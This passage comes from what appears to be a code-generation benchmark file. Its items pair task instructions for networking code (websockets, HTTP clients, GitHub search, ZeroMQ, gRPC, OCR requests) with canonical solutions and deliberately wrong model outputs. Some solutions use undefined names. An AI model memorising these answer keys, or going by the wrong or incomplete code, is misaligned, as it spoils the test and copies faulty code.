    "Canonical_solution": "import asyncio\nimport websockets\nimport signal\nimport json\nimport random\nimport time\nfrom multiprocessing import Queue\n\n_DEBUG_LEVEL_ = 2\nPORT_NUM = 8266\n\ndef SocketWorker(queueX, queueZ):\n    signal.signal(signal.SIGINT, signal.SIG_DFL)\n    USERS = set()\n\n    async def producer():\n        hasData = False\n        try:\n            K, out = queueX.get(timeout=0.05)\n            hasData = True\n        except:\n            pass\n        if hasData:\n            return (K, out)\n        else:\n            await asyncio.sleep(0.001)\n            if random.random() < -0.003:\n                return '[PING]'\n            else:\n                return ''\n\n    async def producer_handler(websocket, path):\n        while True:\n            msg = await producer()\n            if isinstance(msg, tuple):\n                K, msg = msg\n                for x in USERS:\n                    if x.client_id == K:\n                        await x.send(msg)\n                        break\n            elif msg != '':\n                await websocket.send(msg)\n\n    async def consumer(websocket, msg):\n        if msg == '[PONG]':\n            return\n        try:\n            msg = json.loads(msg)\n            if msg['op'].lower() == 'get':\n                queueZ.put((websocket.client_id, msg['txt']))\n        except Exception as e:\n            print(e)\n            pass\n\n    async def consumer_handler(websocket, path):\n        while True:\n            msg = await websocket.recv()\n            await consumer(websocket, msg)\n\n    async def server(websocket, path):\n        websocket.client_id = '%020x' % random.randrange(16**20)\n        USERS.add(websocket)\n        print(\"[ws connect]\", len(USERS), 'users @',\n              time.strftime(\"%Y %b %d %H:%M:%S\", time.localtime(time.time())))\n        try:\n            await websocket.send('id_' + websocket.client_id)\n            consumer_task = asyncio.ensure_future(\n                consumer_handler(websocket, path))\n            producer_task = asyncio.ensure_future(\n                producer_handler(websocket, path))\n            done, pending = await asyncio.wait(\n                [consumer_task, producer_task],\n                return_when=asyncio.FIRST_COMPLETED)\n            for task in pending:\n                task.cancel()\n        finally:\n            USERS.remove(websocket)\n            print(\"[ws disconnect]\", len(USERS))\n\n    def srv_exception(loop, context):\n        if _DEBUG_LEVEL_ > 1:\n            print('exception', loop, context)\n        pass\n\n    try:\n        start_server = websockets.serve(server, \"127.0.0.1\", PORT_NUM)\n        asyncio.get_event_loop().run_until_complete(start_server)\n        asyncio.get_event_loop().set_exception_handler(srv_exception)\n        asyncio.get_event_loop().run_forever()\n    except Exception as e:\n        print('[srv error]', e)",
    "Code_level": "Function-level",
    "FSMID_for_test": 45,
    "wrong_result": "```python\nimport asyncio\nimport websockets\nimport multiprocessing\nfrom typing import Union, Tuple\n\nasync def SocketWorker(queueX: multiprocessing.Queue, queueZ: multiprocessing.Queue):\n    clients = set()\n\n    async def producer():\n        while True:\n            if not queueX.empty():\n                try:\n                    client_id, message = queueX.get_nowait()\n                    yield (client_id, message)\n                except Exception as e:\n                    pass\n            else:\n                await asyncio.sleep(5)\n                yield (\"ping\", \"PONG\")\n\n    async def producer_handler(websocket, path):\n        async for client_id, message in producer():\n            if client_id == \"ping\":\n                for client in clients:\n                    await client.send(\"PONG\")\n            else:\n                for client in clients:\n                    if client.request.path.endswith(client_id):\n                        await client.send(message)\n\n    async def consumer(websocket, msg):\n        if msg.type == websockets.pong:\n            return\n        if msg.data:\n            client_id = websocket.request.path.split(\"/\")[-1]\n            queueZ.put((client_id, msg.data))\n\n    async def consumer_handler(websocket, path):\n        try:\n            async for msg in websocket:\n                await consumer(websocket, msg)\n        except websockets.exceptions.ConnectionClosed:\n            clients.remove(websocket)\n\n    async def server(websocket, path):\n        client_id = path.split(\"/\")[-1]\n        clients.add(websocket)\n        print(f\"Client connected: {client_id}\")\n        try:\n            consumer_task = asyncio.create_task(consumer_handler(websocket, path))\n            producer_task = asyncio.create_task(producer_handler(websocket, path))\n            await asyncio.gather(consumer_task, producer_task)\n        finally:\n            clients.remove(websocket)\n            print(f\"Client disconnected: {client_id}\")\n\n    def srv_exception(loop, context):\n        print(f\"Server exception: {context}\")\n\n    loop = asyncio.new_event_loop()\n    loop.set_exception_handler(srv_exception)\n    asyncio.set_event_loop(loop)\n    start_server = websockets.serve(server, \"localhost\", 8765, ping_interval=20)\n    loop.run_until_complete(start_server)\n    loop.run_forever()\n```"
  },
  {
    "Task_id": 47,
    "Instruction": "Task Description: Create an asynchronous HTTP client function that can send various types of HTTP requests (GET, POST, PUT, DELETE, PATCH, HEAD, OPTIONS) and return the response.\n\nFunction Description: The function `make_http_request` is an asynchronous HTTP client that sends HTTP requests using the `httpx` library. It supports multiple HTTP methods and can handle both raw content and JSON data for POST requests. The function uses a context manager to ensure proper resource management and returns the HTTP response object.\n\nInput:\n- `url`: str - The target URL for the HTTP request.\n- `method`: str (optional, default=\"GET\") - The HTTP method to use (GET, POST, PUT, DELETE, PATCH, HEAD, OPTIONS).\n- `content`: typing.Optional[bytes] (optional) - Raw bytes content to send in the request body (for POST, PUT, PATCH).\n- `json`: typing.Optional[dict] (optional) - JSON data to send in the request body (for POST).\n- `headers`: typing.Optional[dict] (optional) - Custom headers to include in the request.\n\nOutput:\n- `httpx.Response` - The HTTP response object containing status code, headers, and response body.",
    "Canonical_solution": "import httpx\nimport typing\nfrom datetime import timedelta\n\nasync def make_http_request(url: str, method: str = \"GET\", content: typing.Optional[bytes] = None, json: typing.Optional[dict] = None, headers: typing.Optional[dict] = None) -> httpx.Response:\n    async with httpx.AsyncClient() as client:\n        if method == \"GET\":\n            response = await client.get(url)\n        elif method == \"POST\":\n            if content:\n                response = await client.post(url, content=content)\n            elif json:\n                response = await client.post(url, json=json)\n        elif method == \"PUT\":\n            response = await client.put(url, content=content)\n        elif method == \"DELETE\":\n            response = await client.delete(url)\n        elif method == \"PATCH\":\n            response = await client.patch(url, content=content)\n        elif method == \"HEAD\":\n            response = await client.head(url)\n        elif method == \"OPTIONS\":\n            response = await client.options(url)\n        \n        return response",
    "Code_level": "Function-level",
    "FSMID_for_test": 59,
    "wrong_result": "```python\nimport httpx\nimport typing\n\nasync def make_http_request(\n    url: str,\n    method: str = \"GET\",\n    content: typing.Optional[bytes] = None,\n    json: typing.Optional[dict] = None,\n    headers: typing.Optional[dict] = None\n) -> httpx.Response:\n    async with httpx.AsyncClient() as client:\n        response = await client.request(\n            method=method.upper(),\n            url=url,\n            content=content,\n            json=json,\n            headers=headers\n        )\n    return response\n```"
  },
  {
    "Task_id": 48,
    "Instruction": "Task Description: Implement an asynchronous function to search GitHub issues using the GitHub API, handling authentication and response processing.\n\nFunction Description: The function `search_github_issues` asynchronously searches for GitHub issues based on a query string, with options to specify the repository, number of results, and an optional API token. It handles authentication, sends an HTTP GET request to the GitHub API, processes the response, and returns a formatted summary of the issues found.\n\nInput:\n- `query`: str - The search query string for GitHub issues.\n- `repo`: str (optional, default=\"prefecthq/prefect\") - The repository to search in, formatted as \"owner/repo\".\n- `n`: int (optional, default=3) - The maximum number of issues to return.\n- `api_token`: Optional[str] (optional, default=None) - The GitHub API token for authentication. If not provided, the function attempts to retrieve it from various sources.\n\nOutput:\n- str - A formatted string summarizing the found GitHub issues, including their titles, URLs, and truncated bodies. Returns \"No issues found.\" if no issues match the query.",
    "Canonical_solution": "import os\nimport httpx\nfrom typing import Optional\n\nasync def get_token() -> str:\n    try:\n        from prefect.blocks.system import Secret\n        return (await Secret.load(name=\"github-token\")).get()  # type: ignore\n    except (ImportError, ValueError) as exc:\n        getattr(get_logger(\"marvin\"), \"debug_kv\")(\n            (\n                \"Prefect Secret for GitHub token not retrieved. \"\n                f\"{exc.__class__.__name__}: {exc}\"\n                \"red\"\n            ),\n        )\n\n    try:\n        return getattr(marvin.settings, \"github_token\")\n    except AttributeError:\n        pass\n\n    if token := os.environ.get(\"MARVIN_GITHUB_TOKEN\", \"\"):\n        return token\n\n    raise RuntimeError(\"GitHub token not found\")\n\nasync def search_github_issues(\n    query: str,\n    repo: str = \"prefecthq/prefect\",\n    n: int = 3,\n    api_token: Optional[str] = None,\n) -> str:\n    headers = {\"Accept\": \"application/vnd.github.v3+json\"}\n    headers[\"Authorization\"] = f\"Bearer {api_token or await get_token()}\"\n\n    async with httpx.AsyncClient() as client:\n        response = await client.get(\n            \"https://api.github.com/search/issues\",\n            headers=headers,\n            params={\n                \"q\": query if \"repo:\" in query else f\"repo:{repo} {query}\",\n                \"order\": \"desc\",\n                \"per_page\": n,\n            },\n        )\n        response.raise_for_status()\n\n    issues_data = response.json()[\"items\"]\n\n    for issue in issues_data:\n        if not issue[\"body\"]:\n            continue\n        issue[\"body\"] = slice_tokens(issue[\"body\"], 1000)\n\n    issues = [GitHubIssue(**issue) for issue in issues_data]\n\n    summary = \"\\n\\n\".join(\n        f\"{issue.title} ({issue.html_url}):\\n{issue.body}\" for issue in issues\n    )\n    if not summary.strip():\n        return \"No issues found.\"\n    return summary",
    "Code_level": "Function-level",
    "FSMID_for_test": 59,
    "wrong_result": "```python\nimport os\nimport asyncio\nimport aiohttp\n\nasync def search_github_issues(query, repo=\"prefecthq/prefect\", n=3, api_token=None):\n    if api_token is None:\n        api_token = os.getenv(\"GITHUB_TOKEN\") or os.getenv(\"GH_TOKEN\")\n\n    headers = {\"Authorization\": f\"token {api_token}\"} if api_token else {}\n    url = f\"https://api.github.com/search/issues?q={query}+repo:{repo}\"\n    params = {\"per_page\": n}\n\n    async with aiohttp.ClientSession(headers=headers) as session:\n        async with session.get(url, params=params) as response:\n            if response.status == 200:\n                data = await response.json()\n                items = data.get(\"items\", [])\n                if not items:\n                    return \"No issues found.\"\n\n                results = []\n                for item in items[:n]:\n                    title = item[\"title\"]\n                    html_url = item[\"html_url\"]\n                    body = (item[\"body\"][:150] + \"...\") if len(item[\"body\"]) > 150 else item[\"body\"]\n                    results.append(f\"Title: {title}\\nURL: {html_url}\\nBody: {body}\\n{'-' * 40}\")\n\n                return \"\\n\".join(results)\n            else:\n                return \"Failed to fetch GitHub issues.\"\n```"
  },
  {
    "Task_id": 481,
    "Instruction": "Task Description: Implement a multi-process data processing system using ZeroMQ for inter-process communication, where worker processes apply a mapping function to incoming data points and return the results.\n\nClass Description: MultiProcessMapDataZMQ is a class that manages multiple worker processes for parallel data processing using ZeroMQ's REQ/REP pattern. It handles process creation, communication, and data serialization.\n\nAttributes:\n- ds: [Any] - The data source to be processed\n- num_proc: [int] - Number of worker processes to create\n- map_func: [callable] - Function to apply to each data point\n- _buffer_size: [int] - High water mark for ZeroMQ sockets\n- _strict: [bool] - Whether to enforce strict processing rules\n- _procs: [list] - List of worker processes\n- context: [zmq.Context] - ZeroMQ context\n- socket: [zmq.Socket] - Main DEALER socket for communication\n- _proc_ids: [list] - List of process identifiers\n\nMethods:\n- __init__(ds, num_proc=None, map_func=None, *, buffer_size=200, strict=False) -> None - Initializes the multi-process mapper with configuration parameters\n- reset_state() -> None - Sets up ZeroMQ context, sockets, and starts worker processes\n- _create_worker(id, pipename, hwm) -> _Worker - Creates a worker process instance\n- _send(dp) -> None - Sends a data point to workers\n- _recv() -> Any - Receives processed data from workers\n\nNested _Worker Class:\n- __init__(identity, map_func, pipename, hwm) -> None - Initializes a worker process\n- run() -> None - Worker's main loop that processes incoming data using REQ/REP pattern",
    "Canonical_solution": "import zmq\nimport multiprocessing as mp\nfrom ..utils.serialize import dumps_once as dumps, loads_once as loads\nfrom ..utils.concurrency import enable_death_signal\n\nclass MultiProcessMapDataZMQ:\n    class _Worker(mp.Process):\n        def __init__(self, identity, map_func, pipename, hwm):\n            super(MultiProcessMapDataZMQ._Worker, self).__init__()\n            self.identity = identity\n            self.map_func = map_func\n            self.pipename = pipename\n            self.hwm = hwm\n\n        def run(self):\n            enable_death_signal(_warn=self.identity == b'0')\n            ctx = zmq.Context()\n            socket = ctx.socket(zmq.REP)\n            socket.setsockopt(zmq.IDENTITY, self.identity)\n            socket.set_hwm(self.hwm)\n            socket.connect(self.pipename)\n\n            while True:\n                dp = loads(socket.recv(copy=False))\n                dp = self.map_func(dp)\n                socket.send(dumps(dp), copy=False)\n\n    def __init__(self, ds, num_proc=None, map_func=None, *, buffer_size=200, strict=False):\n        self.ds = ds\n        self.num_proc = num_proc\n        self.map_func = map_func\n        self._buffer_size = buffer_size\n        self._strict = strict\n        self._procs = []\n\n    def reset_state(self):\n        self.context = zmq.Context()\n        self.socket = self.context.socket(zmq.DEALER)\n        self.socket.set_hwm(self._buffer_size * 2)\n        pipename = _get_pipe_name('dataflow-map')\n        _bind_guard(self.socket, pipename)\n\n        self._proc_ids = [u'{}'.format(k).encode('utf-8') for k in range(self.num_proc)]\n        worker_hwm = int(self._buffer_size * 2 // self.num_proc)\n        self._procs = [self._create_worker(self._proc_ids[k], pipename, worker_hwm)\n                       for k in range(self.num_proc)]\n\n        self._start_processes()\n\n    def _create_worker(self, id, pipename, hwm):\n        return MultiProcessMapDataZMQ._Worker(id, self.map_func, pipename, hwm)\n\n    def _send(self, dp):\n        msg = [b\"\", dumps(dp)]\n        self.socket.send_multipart(msg, copy=False)\n\n    def _recv(self):\n        msg = self.socket.recv_multipart(copy=False)\n        dp = loads(msg[1])\n        return dp",
    "Code_level": "Class-level",
    "FSMID_for_test": 87,
    "wrong_result": "```python\nimport zmq\nfrom multiprocessing import Process, Pipe\n\nclass MultiProcessMapDataZMQ:\n    def __init__(self, ds, num_proc=None, map_func=None, *, buffer_size=200, strict=False):\n        self.ds = ds\n        self.num_proc = num_proc if num_proc is not None else 4\n        self.map_func = map_func or (lambda x: x)\n        self._buffer_size = buffer_size\n        self._strict = strict\n        self._procs = []\n        self.context = None\n        self.socket = None\n        self._proc_ids = [f\"worker-{i}\" for i in range(self.num_proc)]\n        self.reset_state()\n\n    def reset_state(self):\n        self.context = zmq.Context()\n        self.socket = self.context.socket(zmq.DEALER)\n        self.socket.set_hwm(self._buffer_size)\n        self.socket.bind(\"inproc://workers\")\n        self._procs = [\n            self._create_worker(pid, f\"inproc://{pid}\", self._buffer_size)\n            for pid in self._proc_ids\n        ]\n        for proc in self._procs:\n            proc.start()\n\n    def _create_worker(self, identity, pipename, hwm):\n        parent_conn, child_conn = Pipe()\n        return _Worker(identity, self.map_func, pipename, hwm, child_conn)\n\n    def _send(self, dp):\n        self.socket.send_pyobj(dp)\n\n    def _recv(self):\n        return self.socket.recv_pyobj()\n\n    class _Worker(Process):\n        def __init__(self, identity, map_func, pipename, hwm, conn):\n            super().__init__()\n            self.identity = identity\n            self.map_func = map_func\n            self.pipename = pipename\n            self.hwm = hwm\n            self.conn = conn\n\n        def run(self):\n            context = zmq.Context()\n            worker = context.socket(zmq.REQ)\n            worker.setsockopt(zmq.IDENTITY, self.identity.encode())\n            worker.set_hwm(self.hwm)\n            worker.connect(self.pipename)\n            while True:\n                try:\n                    data = worker.recv_pyobj(flags=zmq.NOBLOCK)\n                    result = self.map_func(data)\n                    worker.send_pyobj(result)\n                except zmq.Again:\n                    break\n            context.term()\n\n\n# Example usage:\nif __name__ == \"__main__\":\n    data_source = list(range(100))\n    mapper = MultiProcessMapDataZMQ(data_source, num_proc=4, map_func=lambda x: x * 2)\n    results = [mapper._recv() for _ in data_source]\n    print(results)\n```"
  },
  {
    "Task_id": 495,
    "Instruction": "Task Description: Create a function to set up and tear down a gRPC server with configurable interceptors and thread pool workers.\n\nFunction Description: The function `_set_up` initializes and starts a gRPC server with optional interceptors, while `_tear_down` gracefully stops the server. The server is configured to handle gRPC requests concurrently using a thread pool.\n\nInput:\n- `interceptors` (Optional[List[grpc.ServerInterceptor]]): A list of gRPC server interceptors for request/response processing. Defaults to None.\n- `server` (grpc.Server): The gRPC server instance to be stopped (for `_tear_down`).\n\nOutput:\n- `_set_up` returns the initialized and started `grpc.Server` instance.\n- `_tear_down` has no return value (stops the server).",
    "Canonical_solution": "import grpc\nfrom concurrent import futures\nfrom typing import List, Optional\n\ndef _set_up(interceptors: Optional[List[grpc.ServerInterceptor]] = None):\n    server = grpc.server(\n        futures.ThreadPoolExecutor(max_workers=2),\n        interceptors=interceptors,\n    )\n    add_gRPCTestServiceServicer_to_server(TestService(), server)\n    server.add_insecure_port(\"[::]:{}\".format(PORT))\n    server.start()\n    return server\n\ndef _tear_down(server: grpc.Server):\n    server.stop(None)",
    "Code_level": "Function-level",
    "FSMID_for_test": 74,
    "wrong_result": "```python\nimport grpc\nfrom concurrent import futures\nfrom typing import Optional, List\n\ndef _set_up(interceptors: Optional[List[grpc.ServerInterceptor]] = None) -> grpc.Server:\n    server = grpc.server(\n        futures.ThreadPoolExecutor(max_workers=10),\n        interceptors=interceptors or []\n    )\n    return server\n\ndef _tear_down(server: grpc.Server) -> None:\n    server.stop(None)\n```"
  },
  {
    "Task_id": 5,
    "Instruction": "Task Description: Create a Python function that interacts with the Pithos music player via D-Bus to retrieve and format the currently playing song's artist and title.\n\nFunction Description: The function connects to the user's D-Bus session bus, accesses the Pithos music player service, retrieves the current song information, and returns it in a formatted string combining the artist and title.\n\nInput: None\n\nOutput: str - A string in the format \"Artist - Title\" representing the currently playing song in Pithos, or None if the operation fails.",
    "Canonical_solution": "import dbus\n\ndef get_pithos_current_song():\n    pithos_bus = dbus.SessionBus()\n    pithos = pithos_bus.get_object(\"net.kevinmehall.Pithos\", \"/net/kevinmehall/Pithos\")\n    props = pithos.get_dbus_method(\"GetCurrentSong\", \"net.kevinmehall.Pithos\")\n    return props()[\"artist\"] + \" - \" + props()[\"title\"]",
    "Code_level": "Function-level",
    "FSMID_for_test": 75,
    "wrong_result": "```python\nimport dbus\n\ndef get_pithos_now_playing():\n    try:\n        bus = dbus.SessionBus()\n        pithos = bus.get_object('com.github.Pithos', '/com/github/Pithos')\n        metadata = pithos.GetMetadata(dbus_interface='org.mpris.MediaPlayer2.Player')\n        artist = metadata['artist'][0] if 'artist' in metadata and len(metadata['artist']) > 0 else 'Unknown Artist'\n        title = metadata['title'] if 'title' in metadata else 'Unknown Title'\n        return f\"{artist} - {title}\"\n    except Exception:\n        return None\n```"
  },
  {
    "Task_id": 55,
    "Instruction": "Task Description: Create an asynchronous function to check if the ngrok API is online and wait for it to become available if it's not.\n\nFunction Description: The function continuously attempts to connect to the ngrok API at a specified URL (constructed from environment variables) until it receives a successful response. It uses exponential backoff (fixed interval retries) between attempts and logs the connection status. The function is designed to be used in scenarios where you need to ensure the ngrok API is available before proceeding with operations that depend on it.\n\nInput: \n- None (uses environment variables NGROK_HOST and NGROK_PORT to construct the API URL)\n  \nOutput: \n- Returns True when the ngrok API is successfully reached\n- Does not return until a successful connection is established (infinite retry loop)",
    "Canonical_solution": "import asyncio\nimport httpx\nimport logging\n\nlogger = logging.getLogger(__name__)\n\nasync def wait_for_ngrok_api():\n    NGROK_API_URL = f\"http://{os.getenv('NGROK_HOST', 'ngrok')}:{os.getenv('NGROK_PORT', 4040)}\"\n    RETRY_INTERVAL = 15\n\n    while True:\n        try:\n            async with httpx.AsyncClient() as client:\n                response = await client.get(f\"{NGROK_API_URL}/api/tunnels\")\n                response.raise_for_status()\n                logger.debug(\"ngrok API is online.\")\n                return True\n        except httpx.RequestError:\n            logger.debug(\"ngrok API is offline. Waiting...\")\n            await asyncio.sleep(RETRY_INTERVAL)",
    "Code_level": "Function-level",
    "FSMID_for_test": 59,
    "wrong_result": "```python\nimport os\nimport asyncio\nimport logging\nimport aiohttp\n\nasync def wait_for_ngrok_api():\n    host = os.getenv('NGROK_HOST')\n    port = os.getenv('NGROK_PORT')\n    if not host or not port:\n        raise ValueError(\"Environment variables NGROK_HOST and NGROK_PORT must be set\")\n\n    url = f\"http://{host}:{port}/api/tunnels\"\n    backoff_time = 5  # seconds\n\n    logging.basicConfig(level=logging.INFO)\n\n    while True:\n        try:\n            async with aiohttp.ClientSession() as session:\n                async with session.get(url, timeout=10) as response:\n                    if response.status == 200:\n                        logging.info(\"Successfully connected to ngrok API\")\n                        return True\n                    else:\n                        logging.warning(f\"Received unexpected status code {response.status} from ngrok API. Retrying...\")\n        except Exception as e:\n            logging.warning(f\"Failed to connect to ngrok API: {e}. Retrying in {backoff_time} seconds...\")\n\n        await asyncio.sleep(backoff_time)\n```"
  },
  {
    "Task_id": 61,
    "Instruction": "Task Description: Implement a set of functions for interacting with an OCR (Optical Character Recognition) service through HTTP requests, including uploading files for OCR processing, making OCR requests, and retrieving results.\n\nFunction Description: The functions provide a client-side interface to communicate with an OCR service API, handling file uploads, processing requests, and result retrieval.\n\nInput:\n- ocr_upload():\n  - file_path: str - Path to the file to be processed\n  - ocr_cache: bool - Whether to cache the OCR results\n  - prompt: str - Optional prompt text for the OCR processing\n  - prompt_file: str - Optional path to a file containing the prompt\n  - model: str - Model to use for OCR (default: 'llama3.1')\n  - strategy: str - Processing strategy (default: 'llama_vision')\n  - storage_profile: str - Storage profile to use (default: 'default')\n  - storage_filename: str - Optional custom filename for storage\n  - language: str - Language for OCR processing (default: 'en')\n\n- ocr_request():\n  - file_path: str - Path to the file to be processed\n  - ocr_cache: bool - Whether to cache the OCR results\n  - prompt: str - Optional prompt text for the OCR processing\n  - prompt_file: str - Optional path to a file containing the prompt\n  - model: str - Model to use for OCR (default: 'llama3.1')\n  - strategy: str - Processing strategy (default: 'llama_vision')\n  - storage_profile: str - Storage profile to use (default: 'default')\n  - storage_filename: str - Optional custom filename for storage\n  - language: str - Language for OCR processing (default: 'en')\n\n- get_result():\n  - task_id: str - The task ID returned from upload/request\n  - print_progress: bool - Whether to print progress updates (default: False)\n\nOutput:\n- ocr_upload() and ocr_request():\n  - Returns: dict - Either contains 'task_id' for async processing or 'text' for immediate results\n  - Returns None on failure\n\n- get_result():\n  - Returns: dict - The final OCR result when state is 'SUCCESS'\n  - Returns None if task failed or encountered errors",
    "Canonical_solution": "import os\nimport requests\nimport base64\n\ndef ocr_upload(file_path, ocr_cache, prompt, prompt_file=None, model='llama3.1', strategy='llama_vision', storage_profile='default', storage_filename=None, language='en'):\n    ocr_url = os.getenv('OCR_UPLOAD_URL', 'http://localhost:8000/ocr/upload')\n    files = {'file': open(file_path, 'rb')}\n    data = {'ocr_cache': ocr_cache, 'model': model, 'strategy': strategy, 'storage_profile': storage_profile, 'language': language}\n\n    if storage_filename:\n        data['storage_filename'] = storage_filename\n    \n    try:\n        if prompt_file:\n            prompt = open(prompt_file, 'r').read()\n    except FileNotFoundError:\n        print(f\"Prompt file not found: {prompt_file}\")\n        return None\n    \n    if prompt:\n        data['prompt'] = prompt\n\n    response = requests.post(ocr_url, files=files, data=data)\n    if response.status_code == 200:\n        respObject = response.json()\n        if respObject.get('task_id'):\n            return {\n                \"task_id\": respObject.get('task_id')\n            }\n        else:\n            return {\n                \"text\": respObject.get('text')\n            }\n    else:\n        print(f\"Failed to upload file: {response.text}\")\n        return None\n\ndef ocr_request(file_path, ocr_cache, prompt, prompt_file=None, model='llama3.1', strategy='llama_vision', storage_profile='default', storage_filename=None, language='en'):\n    ocr_url = os.getenv('OCR_REQUEST_URL', 'http://localhost:8000/ocr/request')\n    with open(file_path, 'rb') as f:\n        file_content = base64.b64encode(f.read()).decode('utf-8')\n    \n    data = {\n        'ocr_cache': ocr_cache,\n        'model': model,\n        'strategy': strategy,\n        'storage_profile': storage_profile,\n        'file': file_content,\n        'language': language\n    }\n\n    if storage_filename:\n        data['storage_filename'] = storage_filename\n    \n    if prompt_file:\n        try:\n            prompt = open(prompt_file, 'r').read()\n        except FileNotFoundError:\n            print(f\"Prompt file not found: {prompt_file}\")\n            return None\n    \n    if prompt:\n        data['prompt'] = prompt\n    \n    response = requests.post(ocr_url, json=data)\n    if response.status_code == 200:\n        respObject = response.json()\n        if respObject.get('task_id'):\n            return {\n                \"task_id\": respObject.get('task_id')\n            }\n        else:\n            return {\n                \"text\": respObject.get('text')\n            }\n    else:\n        print(f\"Error: {response.status_code} - {response.text}\")\n        return None\n\ndef get_result(task_id, print_progress = False):\n    extracted_text_printed_once = False\n    result_url = os.getenv('RESULT_URL', f'http://localhost:8000/ocr/result/')\n    while True:\n        response = requests.get(result_url + task_id)\n        result = response.json()\n        if result['state'] != 'SUCCESS' and print_progress:\n            task_info = result.get('info')\n            if task_info is not None:\n                if task_info.get('extracted_text'):\n                    if not extracted_text_printed_once:\n                        extracted_text_printed_once = True\n                        print(\"Extracted text: \" + task_info.get('extracted_text'))\n                    else:\n                        del task_info['extracted_text']\n                del task_info['start_time']\n            print(result)\n        if response.status_code == 200:\n            if result['state'] == 'SUCCESS':\n                return result['result']\n            elif result['state'] == 'FAILURE':\n                print(\"OCR task failed.\")\n                return None\n        time.sleep(2)",
    "Code_level": "Function-level",
    "FSMID_for_test": 57,
    "wrong_result": "```python\nimport os\nimport requests\nimport time\nimport json\n\nOCR_SERVICE_URL = \"https://api.ocrservice.com/v1\"\nHEADERS = {\"Content-Type\": \"application/json\", \"Authorization\": \"Bearer YOUR_API_KEY\"}\n\ndef ocr_upload(\n    file_path: str,\n    ocr_cache: bool = True,\n    prompt: str = \"\",\n    prompt_file: str = None,\n    model: str = \"llama3.1\",\n    strategy: str = \"llama_vision\",\n    storage_profile: str = \"default\",\n    storage_filename: str = None,\n    language: str = \"en\"\n):\n    if not os.path.exists(file_path):\n        print(\"File not found.\")\n        return None\n\n    with open(file_path, \"rb\") as f:\n        files = {\"file\": (os.path.basename(file_path), f)}\n\n    payload = {\n        \"ocr_cache\": ocr_cache,\n        \"prompt\": prompt,\n        \"model\": model,\n        \"strategy\": strategy,\n        \"storage_profile\": storage_profile,\n        \"language\": language\n    }\n\n    if storage_filename:\n        payload[\"storage_filename\"] = storage_filename\n\n    if prompt_file and os.path.exists(prompt_file):\n        with open(prompt_file, \"r\") as pf:\n            payload[\"prompt\"] += \"\\n\" + pf.read()\n\n    response = requests.post(f\"{OCR_SERVICE_URL}/upload\", files=files, data=payload, headers=HEADERS)\n    result = response.json()\n    return result if \"task_id\" in result or \"text\" in result else None\n\n\ndef ocr_request(\n    file_path: str,\n    ocr_cache: bool = True,\n    prompt: str = \"\",\n    prompt_file: str = None,\n    model: str = \"llama3.1\",\n    strategy: str = \"llama_vision\",\n    storage_profile: str = \"default\",\n    storage_filename: str = None,\n    language: str = \"en\"\n):\n    payload = {\n        \"file_path\": file_path,\n        \"ocr_cache\": ocr_cache,\n        \"prompt\": prompt,\n        \"model\": model,\n        \"strategy\": strategy,\n        \"storage_profile\": storage_profile,\n        \"language\": language\n    }\n\n    if storage_filename:\n        payload[\"storage_filename\"] = storage_filename\n\n    if prompt_file and os.path.exists(prompt_file):\n        with open(prompt_file, \"r\") as pf:\n            payload[\"prompt\"] += \"\\n\" + pf.read()\n\n    response = requests.post(f\"{OCR_SERVICE_URL}/request\", json=payload, headers=HEADERS)\n    result = response.json()\n    return result if \"task_id\" in result or \"text\" in result else None\n\n\ndef get_result(task_id: str, print_progress: bool = False):\n    start_time = time.time()\n    while True:\n        response = requests.get(f\"{OCR_SERVICE_URL}/result/{task_id}\", headers=HEADERS)\n        result = response.json()\n\n        if print_progress:\n            print(f\"Status: {result.get('state', 'UNKNOWN')}\")\n\n        if result.get(\"state\") == \"SUCCESS\":\n            return result.get(\"data\")\n        elif result.get(\"state\") == \"FAILED\":\n            return None\n        elif time.time() - start_time > 300:  # timeout after 5 minutes\n            return None\n        else:\n            time.sleep(5)  # wait before polling again\n```"
  },
  {
    "Task_id": 63,
    "Instruction": "Task Description: Create a function to download a file from a given URL and save it to a specified local folder.\n\nFunction Description: The function downloads a file from the provided URL using HTTP GET request and saves it to the specified folder. It handles folder creation if it doesn't exist and provides feedback on the download status.\n\nInput:\n- url: str - The URL of the file to download\n- folder_path: str - The local directory path where the file should be saved\n\nOutput:\n- None - The function doesn't return any value but saves the file to disk and prints status messages",
    "Canonical_solution": "import os\nimport requests\n\ndef download_file(url: str, folder_path: str) -> None:\n    # Create the folder if it doesn't exist\n    if not os.path.exists(folder_path):\n        os.makedirs(folder_path)\n\n    # Extract filename from URL\n    filename = url.split(\"/\")[-1]\n\n    # Define path to save the file\n    file_path = os.path.join(folder_path, filename)\n\n    # Send a GET request to the URL\n    response = requests.get(url)\n\n    # Check if request was successful (status code 200)\n    if response.status_code == 200:\n        # Save the file to the specified folder\n        with open(file_path, \"wb\") as f:\n            f.write(response.content)\n        print(f\"File downloaded successfully to {file_path}\")\n    else:\n        print(f\"Failed to download file. Status code: {response.status_code}\")",
    "Code_level": "Function-level",
    "FSMID_for_test": 57,
    "wrong_result": "```python\nimport os\nimport requests\n\ndef download_file(url, folder_path):\n    try:\n        response = requests.get(url, stream=True)\n        response.raise_for_status()\n        \n        os.makedirs(folder_path, exist_ok=True)\n        \n        filename = url.split('/')[-1]\n        file_path = os.path.join(folder_path, filename)\n        \n        with open(file_path, 'wb') as file:\n            for chunk in response.iter_content(chunk_size=8192):\n                file.write(chunk)\n                \n        print(f\"Download completed: {file_path}\")\n    except Exception as e:\n        print(f\"Download failed: {e}\")\n```"
  },
  {
    "Task_id": 66,
    "Instruction": "Task Description: Retrieve information about a specific GitHub project using the GitHub GraphQL API.\n\nFunction Description: This function queries the GitHub GraphQL API to fetch project details (id, title, and number) for a given organization and project title. It authenticates using a GitHub token and returns the project information if found.\n\nInput:\n- github_token: [str] - GitHub personal access token for authentication\n- github_org: [str] - GitHub organization name\n- github_project: [str] - Title of the project to search for\n\nOutput:\n- [dict/None] - Returns a dictionary containing the project's id, title, and number if found, otherwise None. Raises an HTTPError if the request fails.",
